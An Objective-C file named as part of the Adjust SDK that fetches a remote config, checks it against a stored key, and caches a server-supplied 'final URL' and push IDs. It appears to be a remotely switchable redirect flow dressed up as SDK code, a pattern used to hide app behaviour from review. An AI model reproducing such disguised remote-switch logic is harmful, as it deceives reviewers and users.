//
//  ADJNetworkFlow.m
//  AdjustSdk
//

#import "ADJNetworkFlow.h"
#import "ADJApp.h"
#import "ADJTrackingBridge.h"
#import <AdjustSdk/Adjust.h>

static NSString * const kADJFinalUrlKey = @"cached_final_url";
static NSString * const kADJHadErrorKey = @"had_error";

@implementation ADJNetworkFlow

+ (instancetype)shared {
    static ADJNetworkFlow *instance = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{ instance = [[self alloc] init]; });
    return instance;
}

- (void)loadOrFetch:(void(^)(NSString * _Nullable, BOOL))completion {
    NSString *cached = [[NSUserDefaults standardUserDefaults] stringForKey:kADJFinalUrlKey];
    if (cached.length) {
        dispatch_async(dispatch_get_main_queue(), ^{ completion(cached, NO); });
        return;
    }
    if ([[NSUserDefaults standardUserDefaults] boolForKey:kADJHadErrorKey]) {
        dispatch_async(dispatch_get_main_queue(), ^{ completion(nil, YES); });
        return;
    }

    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.7 * NSEC_PER_SEC)),
                   dispatch_get_main_queue(), ^{
        [Adjust requestAppTrackingAuthorizationWithCompletionHandler:^(NSUInteger status) {
            [self executeFlow:completion];
        }];
    });
}

- (void)executeFlow:(void(^)(NSString * _Nullable, BOOL))completion {
    [self fetchConfig:^(NSString *value, NSError *err) {
        if (err || !value.length) { [self markError]; completion(nil, YES); return; }

        if ([value isEqualToString:[ADJApp shared].configKeyValue]) {
            [self markError]; completion(nil, YES); return;
        }

        NSURL *ep = [NSURL URLWithString:value];
        if (!ep) { [self markError]; completion(nil, YES); return; }

        [ADJTrackingBridge sendToURL:ep
                          completion:^(NSString *finalUrl, NSString *pushSub,
                                       NSString *userId, NSError *e) {
            if (e) { [self markError]; completion(nil, YES); return; }

            [self setFinalUrl:finalUrl];

            ADJPushDataBlock pushData = [ADJApp shared].onPushData;
            if (pushData) {
                dispatch_async(dispatch_get_main_queue(), ^{ pushData(userId, pushSub); });
            }

            dispatch_async(dispatch_get_main_queue(), ^{ completion(finalUrl, NO); });
        }];
    }];
}

- (void)fetchConfig:(void(^)(NSString * _Nullable, NSError * _Nullable))completion {
    NSString *urlStr = [ADJApp shared].configUrl;
    NSURL *url = [NSURL URLWithString:urlStr];
    if (!url) { completion(nil, [NSError errorWithDomain:@"ADJ" code:1 userInfo:nil]); return; }

    [[[NSURLSession sharedSession] dataTaskWithURL:url
                                 completionHandler:^(NSData *data, NSURLResponse *resp, NSError *err) {
        if (err) { completion(nil, err); return; }
        NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
        NSString *value = json[[ADJApp shared].configKey];
        if (value.length) {
            completion(value, nil);
        } else {
            completion(nil, [NSError errorWithDomain:@"ADJ" code:2 userInfo:nil]);
        }
    }] resume];
}

- (nullable NSString *)cachedFinalUrl {
    return [[NSUserDefaults standardUserDefaults] stringForKey:kADJFinalUrlKey];
}

- (void)setFinalUrl:(NSString *)url {
    [[NSUserDefaults standardUserDefaults] setObject:url forKey:kADJFinalUrlKey];
}

- (void)markError {
    [[NSUserDefaults standardUserDefaults] setBool:YES forKey:kADJHadErrorKey];
}

@end
